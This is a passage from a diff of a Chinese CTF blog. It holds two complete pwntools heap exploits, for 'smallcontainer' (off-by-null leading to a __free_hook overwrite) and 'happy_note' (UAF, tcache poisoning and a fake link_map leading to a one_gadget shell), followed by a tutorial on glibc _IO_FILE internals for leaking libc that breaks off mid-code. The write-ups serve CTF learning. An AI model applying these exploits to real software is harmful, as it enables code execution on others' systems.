class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./smallcontainer&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Input size: &quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Input index: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(0x1f8)#0</span><br><span class="line">add(0x110)#1</span><br><span class="line">add(0x110)#2</span><br><span class="line">for i in range(8):#3-10</span><br><span class="line">    add(0x1f8)</span><br><span class="line"></span><br><span class="line">for j in range(3,10):</span><br><span class="line">    delete(j)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(0x208)#0</span><br><span class="line">add(0x208)#3</span><br><span class="line">add(0x218)#4</span><br><span class="line"></span><br><span class="line">edit(10,b&#x27;a&#x27;*0x1f8)#这里是off by null讲堆块0的inuse位改为0</span><br><span class="line">edit(10,b&#x27;a&#x27;*0x1f0+p64(0x1440))#这里才是修改prevsize造成向后合并</span><br><span class="line">edit(0,b&#x27;a&#x27;*0x1f0+p64(0)+p64(0x221))#恢复堆块结构</span><br><span class="line">delete(0)#将堆块都合并成了一个unsorted bin</span><br><span class="line">for k in range(7):#5-9,11,12</span><br><span class="line">    add(0x1f8)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x1f8)#2</span><br><span class="line">show(1)</span><br><span class="line">libc_base = int(io.recv(12),16)-96-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">free_hook = libc_base+libc.symbols[&quot;__free_hook&quot;]</span><br><span class="line"></span><br><span class="line">add(0x1f8)#12</span><br><span class="line">edit(12,b&#x27;a&#x27;*0x110+p64(0)+p64(0x121)+p64(free_hook))</span><br><span class="line">add(0x110)#13</span><br><span class="line">add(0x110)#14</span><br><span class="line">one_gadget = libc_base+0x4f302</span><br><span class="line">edit(14,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">log.success(&quot;libc_base: &quot;+hex(libc_base))</span><br><span class="line"># gdb.attach(r)</span><br><span class="line">delete(2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="happy-note"><a href="#happy-note" class="headerlink" title="happy_note"></a>happy_note</h1><p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x58)</span><br><span class="line">payload += p64(0x8)</span><br><span class="line">payload += p64(ogg)</span><br><span class="line">payload = payload.ljust(0x100, b&#x27;\x00&#x27;)</span><br><span class="line">payload += p64(fake_rtld + 0x40)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(fake_rtld + 0x48)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(4, payload)</span><br><span class="line">edit(8, b&#x27;\x00&#x27; * (0x12c - 0x10) + p8(8))</span><br><span class="line">delete(10)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
     </div>
 
     
-      <div class="footer-dsc">
-        
-          Powered by
-          <a 
-            href="https://hexo.io/" 
-            class="footer-link" 
-            target="_blank" 
-            rel="nofollow noopener noreferrer">
-            &nbsp;Hexo
-          </a>
-        
-        
-          <span>&nbsp;|&nbsp;</span>
-        
-        
-          Theme -
-          <a 
-            href="https://github.com/theme-kaze" 
-            class="footer-link" 
-            target="_blank"
-            rel="nofollow noopener noreferrer">
-            &nbsp;Kaze
-          </a>
-        
-      </div>
     
     
-    
-    
-</footer>
- 
-    
-  <a 
-    role="button" 
-    id="scrollbutton" 
-    class="basebutton" 
-    aria-label="回到顶部">
-    <i class="iconfont icon-arrowleft button-icon"></i>
-  </a>
 
-<a 
-  role="button" 
-  id="menubutton"
-  aria-label="menu button"
-  class="basebutton">
-  <i class="iconfont icon-menu button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="popbutton" 
-  class="basebutton" 
-  aria-label="控制中心">
-  <i class="iconfont icon-expand button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="darkbutton" 
-  class="basebutton darkwidget" 
-  aria-label="夜色模式">
-  <i class="iconfont icon-weather button-icon"></i>
-</a>
-<a 
-  role="button" 
-  id="searchbutton" 
-  class="basebutton searchwidget" 
-  aria-label="搜索">
-  <i class="iconfont icon-search button-icon"></i>
-</a> 
-     
-     
-     
-     
-    <script src="/js/main.js"></script> 
-     
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
-      <script>
-        var addLazyload = function () {
-          var observer = lozad('.lozad', {
-            load: function (el) {
-              el.srcset = el.getAttribute('data-src')
-            },
-            loaded: function (el) {
-              el.classList.add('loaded')
-            },
-          })
-          observer.observe()
-        }
-      </script>
-      <script>
-        loadScript('/js/lib/lozad.min.js', addLazyload)
-      </script>
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" class="post-title-link" itemprop="url">利用_IO_2_1_stdout泄露libc</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-06 20:47:44" itemprop="dateCreated datePublished" datetime="2022-08-06T20:47:44+08:00">2022-08-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-07 16:19:01" itemprop="dateModified" datetime="2022-08-07T16:19:01+08:00">2022-08-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
     
-    <script src="//instant.page/5.1.0" type="module"
-      integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
     
     
-  </body>
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="FILE结构-libc2-23"><a href="#FILE结构-libc2-23" class="headerlink" title="FILE结构(libc2.23)"></a>FILE结构(libc2.23)</h2><p>FILE在linux系统的标准IO库使用来描述文件结构，称之为文件流。这里提及的”流“其实是一种抽象的概念，无论是硬件还是软件其实都没有”流“一说，只是人们为了便于描述数据的流向而创造的名称。比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流“FILE结构在程序执行fopen函数时会自动进行创建，并分配在堆中。我们常定义一个纸箱FILE结构的指针来接收这个返回值</p>
+<p>FILE结构定义在<code>glibc/libio/libio.h</code>中，结构源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE &#123;</span><br><span class="line">  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line">#define _IO_file_flags _flags</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br><span class="line">  char* _IO_read_ptr;	/* Current read pointer */</span><br><span class="line">  char* _IO_read_end;	/* End of get area. */</span><br><span class="line">  char* _IO_read_base;	/* Start of putback+get area. */</span><br><span class="line">  char* _IO_write_base;	/* Start of put area. */</span><br><span class="line">  char* _IO_write_ptr;	/* Current put pointer. */</span><br><span class="line">  char* _IO_write_end;	/* End of put area. */</span><br><span class="line">  char* _IO_buf_base;	/* Start of reserve area. */</span><br><span class="line">  char* _IO_buf_end;	/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">#if 0</span><br><span class="line">  int _blksize;</span><br><span class="line">#else</span><br><span class="line">  int _flags2;</span><br><span class="line">#endif</span><br><span class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */</span><br><span class="line"></span><br><span class="line">#define __HAVE_COLUMN /* temporary */</span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  /*  char* _save_gptr;  char* _save_egptr; */</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p>
+<p><img src="https://s2.loli.net/2022/08/06/s2uvBVPLgDSjyk4.png" alt="图片.png"></p>
+<p>在标准I/O库中，每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code></p>
+<h2 id="IO-FILE-plus结构"><a href="#IO-FILE-plus结构" class="headerlink" title="_IO_FILE_plus结构"></a>_IO_FILE_plus结构</h2><p>事实上_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针vtable（虚表）指向了一系列函数指针：</p>
+<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8。位置为glibc/libio/libioP.h</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里说明一下vtable(虚表)是个什么东西，我们在学C语言的时候会学到一个叫做虚函数的东西，具有虚函数的类都会有一张vtable(虚表)，其中记录了本类中所有虚函数的函数指针，也就是说是个函数指针数组的起始位置，通常虚表在编程中所具有的作用是为了标识父类。需要注意的是虚表中值班韩虚函数的指针，没有函数体，虚函数表既有继承性又有多态性<br>vtable 是IO_jump_t 类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准 IO 函数中会调用这些函数指针。也就是说，如果使用_IO_FILE_plus去定义一个结构体指针的话，我们既可以使用IO_FILE中的结构体成员变量，也能使用IO_jump_t中的函数指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] = &#123;</span><br><span class="line">   1 NULL, // &quot;extra word&quot;</span><br><span class="line">   2 NULL, // DUMMY</span><br><span class="line">   3 exit, // finish</span><br><span class="line">   4 NULL, // overflow</span><br><span class="line">   5 NULL, // underflow</span><br><span class="line">   6 NULL, // uflow</span><br><span class="line">   7 NULL, // pbackfail</span><br><span class="line">   </span><br><span class="line">   8 NULL, // xsputn  #printf后面讲解执行流程章节会用到此处</span><br><span class="line">   9 NULL, // xsgetn</span><br><span class="line">   10 NULL, // seekoff</span><br><span class="line">   11 NULL, // seekpos</span><br><span class="line">   12 NULL, // setbuf</span><br><span class="line">   13 NULL, // sync</span><br><span class="line">   14 NULL, // doallocate</span><br><span class="line">   15 NULL, // read</span><br><span class="line">   16 NULL, // write</span><br><span class="line">   17 NULL, // seek</span><br><span class="line">   18 pwn,  // close</span><br><span class="line">   19 NULL, // stat</span><br><span class="line">   20 NULL, // showmanyc</span><br><span class="line">   21 NULL, // imbue</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>_flags规则</p>
+<p>那么通过上述对IO_FILE和_IO_FILE_plus结构的了解，这里我们将深入的讲解一下IO_FILE结构体中的第一个成员变量_flag，这个成员变量在利用_IO_2_1_stdout泄露libc的时候具有至关重要的作用。</p>
+<p>先简单介绍一下_flag的规则，_flag的高两位字节是由libc固定的，不同的libc可能存在差异，但是基本上都一样：0xfbad0000。高两位字节其实就是作为一个标识，标志这是一个什么文件。而低两位字节的位数规则决定了程序的执行状态，低两位的规则如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_MAGIC 0xFBAD0000 /* Magic number */</span><br><span class="line">#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */</span><br><span class="line">#define _IO_MAGIC_MASK 0xFFFF0000</span><br><span class="line">#define _IO_USER_BUF 1 /* User owns buffer; don&#x27;t delete it on close. */</span><br><span class="line">#define _IO_UNBUFFERED 2</span><br><span class="line">#define _IO_NO_READS 4 /* Reading not allowed */</span><br><span class="line">#define _IO_NO_WRITES 8 /* Writing not allowd */</span><br><span class="line">#define _IO_EOF_SEEN 0x10</span><br><span class="line">#define _IO_ERR_SEEN 0x20</span><br><span class="line">#define _IO_DELETE_DONT_CLOSE 0x40 /* Don&#x27;t call close(_fileno) on cleanup. */</span><br><span class="line">#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/</span><br><span class="line">#define _IO_IN_BACKUP 0x100</span><br><span class="line">#define _IO_LINE_BUF 0x200</span><br><span class="line">#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */</span><br><span class="line">#define _IO_CURRENTLY_PUTTING 0x800</span><br><span class="line">#define _IO_IS_APPENDING 0x1000</span><br><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line">#define _IO_BAD_SEEN 0x4000</span><br><span class="line">#define _IO_USER_LOCK 0x8000</span><br></pre></td></tr></table></figure>
+
+<p>一般在执行流程中会将<code>_flag</code>和定义常量进行<code>按位与</code>运算，并根据与运算的结构进行判断如何执行。后面_IO_2_1_stdout泄露libc章节，我们会一起走一遍输出函数执行流程，在其中就会<code>运用到此处的内容</code></p>
+<h2 id="puts-函数执行流程"><a href="#puts-函数执行流程" class="headerlink" title="puts()函数执行流程"></a>puts()函数执行流程</h2><p>类似的输出函数比如fwrite函数等执行流程都差不多，区别在于由libc库中运行各个输出函数的.c文件不一样，但是流程都相似，并且都会殊途同归进行输出系统调用</p>
+<h3 id="IO-puts-–-gt-IO-new-file-xsputn"><a href="#IO-puts-–-gt-IO-new-file-xsputn" class="headerlink" title="_IO_puts –&gt; _IO_new_file_xsputn"></a>_IO_puts –&gt; _IO_new_file_xsputn</h3><p>puts()函数在源码中的表现形式为_IO_puts，我们一起来看一下源码位置在：<code>glibc/libio/ioputs.c</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  _IO_size_t len = strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  if ((_IO_vtable_offset (_IO_stdout) != 0</span><br><span class="line">       || _IO_fwide (_IO_stdout, -1) == -1)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (&#x27;\n&#x27;, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + 1);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到_IO_puts在过程当中调用了一个叫做<code>_IO_sputn</code>函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个<code>宏</code>，它的作用就是调用<code>_IO_2_1_stdout_</code>中的<code>vtable</code>所指向的<code>_xsputn</code>，也就是`_IO_new_file_xsputn函数</p>
+<p>_IO_new_file_xsputn –&gt; _IO_OVERFLOW</p>
+<p>_IO_new_file_xsputn函数源码位置在：glibc/libio/fileops.c</p>
+<p>由于_IO_new_file_xsputn函数的源码过长，这里就不大篇幅的贴图了。这里简单的描述一下这个函数的执行过程，在关键部分展示代码：首先进入函数之后判断输出缓冲区还有多少空间，这里是由_IO_write_end - _IO_write_base得来的，这两个是FILE结构体中的两个成员变量，分别是输出结束地址和其实输出地址，由于stdout也是FILE结构，所以后面就直接使用成员变量名称来描述了。接下来如果缓冲区有空间，则先把数据载入输出缓冲区并计算目标输出数据是否还有剩余</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">/* If nothing else has to be written we must not signal the</span><br><span class="line">   caller that everything has been written.  */</span><br><span class="line">return to_do == 0 ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>
+
+<p>经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过<code>_IO_OVERFLOW</code>函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为<code>__overflow</code></p>
+<h3 id="IO-new-file-overflow-–-gt-IO-do-write"><a href="#IO-new-file-overflow-–-gt-IO-do-write" class="headerlink" title="_IO_new_file_overflow –&gt; _IO_do_write"></a>_IO_new_file_overflow –&gt; _IO_do_write</h3><p>_IO_new_file_overflow`函数的部分源码如下，位置在：glibc/libio/fileops.c</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span 